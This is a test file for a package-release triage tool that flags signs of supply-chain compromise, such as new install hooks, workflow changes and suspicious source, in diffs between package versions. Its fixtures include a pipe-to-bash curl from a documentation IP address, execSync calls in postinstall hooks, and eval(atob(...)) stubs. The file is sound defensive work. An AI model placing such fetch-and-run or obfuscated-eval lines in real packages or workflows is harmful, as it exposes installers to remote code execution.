from pathlib import Path

from hunter.jev import STATE_TOKEN_BUDGET, pack_chunks
from hunter.jev_tokens import state_tokens
from hunter.models import ReleaseMeta
from hunter.triage import diff_trees


def test_triage_keeps_signals_and_drops_noise():
    old = {
        "README.md": "old readme\n",
        "CHANGELOG.md": "old notes\n",
        "docs/guide.md": "old guide\n",
        "package-lock.json": '{"lock": 1}\n',
    }
    new = {
        "README.md": "new readme\n",
        "CHANGELOG.md": "new notes\n",
        "docs/guide.md": "new guide\n",
        "package-lock.json": '{"lock": 2}\n',
        "package.json": '{"scripts": {"postinstall": "node lib/run.js"}}\n',
        "lib/run.js": "const { execSync } = require('child_process');\nexecSync('echo hi');\n",
        ".github/workflows/ci.yml": "jobs:\n  build:\n    steps:\n      - run: curl http://203.0.113.10 | bash\n",
        "bin/tool.js": "console.log('tool');\n",
    }
    diffs = diff_trees(old, new)
    categories = {item.path: item.category for item in diffs}
    assert "README.md" not in categories
    assert "CHANGELOG.md" not in categories
    assert "docs/guide.md" not in categories
    assert "package-lock.json" not in categories
    assert categories["package.json"] == "install_scripts"
    assert categories["lib/run.js"] == "suspicious_source"
    assert categories[".github/workflows/ci.yml"] == "workflows"
    assert categories["bin/tool.js"] == "entry_points"


def test_ranked_excerpt_keeps_a_new_dependency_ahead_of_a_long_changelog(tmp_path: Path):
    from hunter.investigate import excerpt_for
    from hunter.teach import load_release, write_axios_distillation
    from hunter.triage import diff_trees, render_excerpt

    root = write_axios_distillation(tmp_path / "axios-distill")
    _meta, old_files, new_files, label = load_release(root)
    assert label == "compromised_lib"
    plain = render_excerpt(diff_trees(old_files, new_files), limit_chars=12_000)
    assert "plain-crypto-js" not in plain
    ranked = excerpt_for(old_files, new_files)
    assert "plain-crypto-js" in ranked
    assert ranked.find("plain-crypto-js") < ranked.find("CHANGELOG.md")


def _sample_trees() -> tuple[dict[str, str], dict[str, str]]:
    old = {
        "package.json": '{"name":"sample","version":"1.0.0","dependencies":{}}\n',
        "README.md": "old notes\n",
        "package-lock.json": '{"lock":1}\n',
        "lib/util.js": "exports.value = 1;\n",
        "gone.js": "exports.value = 0;\n",
    }
    new = {
        "package.json": (
            '{"name":"sample","version":"1.0.1",'
            '"dependencies":{"codec-pad":"1.0.0"},'
            '"scripts":{"postinstall":"node lib/hook.js"}}\n'
        ),
        "README.md": "new notes\n",
        "package-lock.json": '{"lock":2}\n',
        "lib/util.js": "exports.value = 2;\n",
        "lib/hook.js": "const { execSync } = require('child_process');\nexecSync('echo hi');\n",
        "assets/logo.png": "not-bytes\n",
    }
    return old, new


def test_manifest_lists_every_change_and_why_it_was_dropped():
    from hunter.triage import changed_file_manifest

    manifest = changed_file_manifest(*_sample_trees())
    assert manifest.startswith("[changed_files]\n")
    assert "counts: added=2 deleted=1 modified=4 included=2 dropped=5" in manifest
    assert "modified included package.json (install_scripts)" in manifest
    assert "added included lib/hook.js (suspicious_source)" in manifest
    assert "modified dropped README.md (docs)" in manifest
    assert "modified dropped package-lock.json (lockfile)" in manifest
    assert "added dropped assets/logo.png (binary)" in manifest
    assert "modified dropped lib/util.js (no suspicious pattern)" in manifest
    assert "deleted dropped gone.js (no suspicious pattern)" in manifest


def test_full_diff_keeps_preface_manifest_and_new_file_contents():
    from hunter.triage import full_filtered_diff

    text = full_filtered_diff(*_sample_trees())
    assert text.find("[dependency_delta]") < text.find("[changed_files]")
    assert text.find("[changed_files]") < text.find("--- install_scripts:package.json")
    assert "codec-pad" in text
    assert "execSync('echo hi')" in text
    assert "[added_file:lib/hook.js]" in text
    added_at = text.find("[added_file:lib/hook.js]")
    assert "execSync('echo hi')" in text[added_at:]
    assert "--- binary_media:assets/logo.png" not in text
    assert "not-bytes" not in text
    assert "[TRUNCATION]" not in text


def test_full_diff_writes_a_truncation_note_when_the_cap_is_hit():
    from hunter.triage import full_filtered_diff

    old = {"package.json": '{"name":"sample","version":"1.0.0"}\n'}
    payload = "const { execSync } = require('child_process');\n" + ("A" * 4000) + "\nTAIL_SENTINEL\n"
    new = {
        "package.json": '{"name":"sample","version":"1.0.1","scripts":{"postinstall":"node hook.js"}}\n',
        "hook.js": payload,
    }
    text = full_filtered_diff(old, new, limit_chars=700)
    assert "[changed_files]" in text
    assert "[TRUNCATION]" in text
    assert "The filtered diff was cut at 700 characters." in text
    assert "TAIL_SENTINEL" not in text


def test_added_lines_are_packed_before_removed_lines():
    from hunter.models import FileDiff
    from hunter.triage import render_excerpt

    removed = "R" * 80
    added = "A" * 40 + "ADDED_MARK"
    item = FileDiff(
        path="lib/a.js",
        category="suspicious_source",
        diff_text=(
            "--- a/lib/a.js\n"
            "+++ b/lib/a.js\n"
            "@@ -1 +1 @@\n"
            f"-{removed}\n"
            f"+{added}\n"
        ),
        added_text=added,
        old_text=removed + "\n",
        new_text=added + "\n",
    )
    text = render_excerpt([item])
    assert text.find("ADDED_MARK") < text.find(removed)
    assert text.find("+") < text.find("-" + removed)


def test_code_extensions_cover_jsx_mts_cts_pth_bat_and_cmd():
    from hunter.triage import categorize

    sample = "require('child_process').execSync('curl http://203.0.113.9/x');\n"
    for name in ("view.jsx", "mod.mts", "mod.cts", "nspkg.pth", "install.bat", "install.cmd"):
        assert categorize(name, sample, sample, True) == "suspicious_source"
    assert categorize("notes.txt", sample, sample, True) == "suspicious_payload"


def test_chunks_stay_under_state_budget():
    files = {
        f"lib/part_{index}.js": "const { execSync } = require('child_process');\n" * 8000
        for index in range(4)
    }
    diffs = diff_trees({}, files)
    meta = ReleaseMeta(ecosystem="npm", name="sample", new_version="1.0.0", old_version="0.9.0")
    chunks = pack_chunks(diffs, meta)
    assert len(chunks) > 1
    for state in chunks:
        assert state_tokens(state) <= STATE_TOKEN_BUDGET


def test_source_maps_declarations_snapshots_and_fixtures_are_dropped():
    payload = "const { execSync } = require('child_process');\nexecSync('echo hi');\n"
    new = {
        "lib/app.js.map": "{}\n" + ("A" * 300),
        "lib/app.d.ts": "export function read(path: string): string;\n",
        "src/__snapshots__/app.test.js.snap": "exports[`a`] = `hello`;\n",
        "test/fixtures/data.json": '{"n": 1}\n',
        "test/fixtures/setup.py": "from setuptools import setup\nsetup(name='x')\n",
        "package.json": '{"scripts": {"postinstall": "node lib/run.js"}}\n',
        "lib/run.js": payload,
    }
    categories = {item.path: item.category for item in diff_trees({}, new)}
    assert "lib/app.js.map" not in categories
    assert "lib/app.d.ts" not in categories
    assert "src/__snapshots__/app.test.js.snap" not in categories
    assert "test/fixtures/data.json" not in categories
    assert categories["test/fixtures/setup.py"] == "install_scripts"
    assert categories["package.json"] == "install_scripts"
    assert categories["lib/run.js"] == "suspicious_source"


def test_a_type_declaration_that_runs_a_payload_is_kept():
    from hunter.triage import categorize

    text = "export const payload = atob('aaaa'); eval(payload);\n"
    assert categorize("types.d.ts", text, text, True) == "suspicious_payload"


def test_a_whitespace_copy_in_dist_is_dropped_and_a_dist_only_file_stays():
    body = "require('child_process').execSync('id');\n" + ("const value = 1;\n" * 30)
    copied = {item.path for item in diff_trees({}, {"src/payload.js": body, "dist/payload.js": body})}
    assert "src/payload.js" in copied
    assert "dist/payload.js" not in copied
    only = {item.path for item in diff_trees({}, {"dist/payload.js": body})}
    assert "dist/payload.js" in only
    extra = body + "eval(atob('bbbb'));\n"
    both = {item.path for item in diff_trees({}, {"src/payload.js": body, "dist/payload.js": extra})}
    assert "dist/payload.js" in both


def test_full_diff_still_includes_a_new_file_body():
    from hunter.triage import full_filtered_diff

    text = full_filtered_diff(
        {},
        {
            "package.json": '{"scripts":{"postinstall":"node hook.js"}}\n',
            "hook.js": "require('child_process').execSync('echo hi');\n",
        },
    )
    assert "[added_file:hook.js]" in text
    assert "execSync('echo hi')" in text
